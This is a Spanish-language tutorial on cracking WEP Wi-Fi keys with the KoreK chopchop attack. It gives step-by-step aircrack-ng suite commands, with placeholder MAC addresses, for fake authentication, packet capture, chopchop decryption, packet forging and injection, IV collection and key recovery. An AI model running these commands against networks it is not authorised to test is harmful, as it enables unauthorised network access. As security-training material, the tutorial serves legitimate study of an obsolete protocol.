# Cracking WEP utilizando el Ataque Korek Chopchop

El **ataque Chop-Chop** es un método utilizado para descifrar paquetes cifrados en redes que usan el protocolo WEP. Este ataque explota vulnerabilidades en la forma en que WEP maneja la verificación de integridad de paquetes. Permite descifrar un paquete capturado, reutilizarlo y generar tráfico en la red, recolectando suficientes IVs (vectores de inicialización) para descifrar la clave WEP.

***

#### **Paso 1: Asociarse con el punto de acceso**

Realiza una falsa autenticación con el punto de acceso para establecer comunicación con él:

```bash
aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 66:77:88:99:AA:BB wlan0
```

***

#### **Paso 2: Capturar un paquete**

Usa `airodump-ng` para capturar tráfico de la red objetivo:

```bash
airodump-ng --bssid 00:11:22:33:44:55 --channel 6 -w wep_test wlan0
```

***

#### **Paso 3: Ejecutar el ataque Chop-Chop**

Descifra un paquete capturado usando:

```bash
aireplay-ng -4 -b 00:11:22:33:44:55 -h 66:77:88:99:AA:BB wlan0
```

Se genera un archivo cap.

***

#### **Paso 4: Inyección de paquetes**

1.  Crea un paquete modificado:

    ```bash
    packetforge-ng -0 -a 00:11:22:33:44:55 -h 66:77:88:99:AA:BB -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-123456.cap -w inject_packet
    ```

* **`-k <IP_destino>`**: La dirección IP de destino del paquete que estás creando. Se usa `255.255.255.255` para difundirlo a toda la red (dirección de broadcast).
* **`-l <IP_origen>`**: La dirección IP de origen del paquete. También se puede usar `255.255.255.255` para broadcast.

2. Inyecta el paquete modificado:

```bash
aireplay-ng -2 -r inject_packet wlan0mon
```

***

#### **Paso 5: Recolectar IVs**

Continúa recolectando tráfico hasta obtener suficientes IVs:

```bash
airodump-ng --bssid 00:11:22:33:44:55 --channel 6 -w wep_test wlan0mon
```

***

#### **Paso 6: Descifrar la clave WEP**

Descifra la clave WEP usando los IVs recolectados:

```bash
aircrack-ng -b 00:11:22:33:44:55 wep_test.cap
```

***

Si has recolectado suficientes IVs, se mostrará la clave WEP descifrada.

También existe otra forma de hacerlo.

[https://www.aircrack-ng.org/doku.php?id=es:korek\_chopchop](https://www.aircrack-ng.org/doku.php?id=es:korek_chopchop)
